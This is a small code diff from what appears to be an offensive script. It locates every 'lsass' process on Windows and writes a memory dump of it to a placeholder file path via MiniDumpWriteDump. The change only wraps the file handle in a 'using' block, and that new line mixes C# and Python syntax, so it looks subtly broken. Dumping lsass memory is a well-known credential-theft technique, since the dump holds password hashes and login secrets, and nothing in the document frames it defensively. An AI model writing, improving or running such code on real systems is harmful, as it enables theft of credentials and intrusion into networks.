@@ -10,7 +10,7 @@ procname = 'lsass'
 ids = Process.GetProcessesByName(procname)
 for pid in ids:
     file = "DUMPFILE_PATH"
-    fs = FileStream(file, FileMode.Create, FileAccess.ReadWrite, FileShare.Write)
-    minidumpwritedump(pid.Handle, pid.Id, fs.Handle,0x00000002,0,0,0)
+    using fs = FileStream(file, FileMode.Create, FileAccess.ReadWrite, FileShare.Write):
+        minidumpwritedump(pid.Handle, pid.Id, fs.Handle,0x00000002,0,0,0)
 
 output = "Dumped to $file"
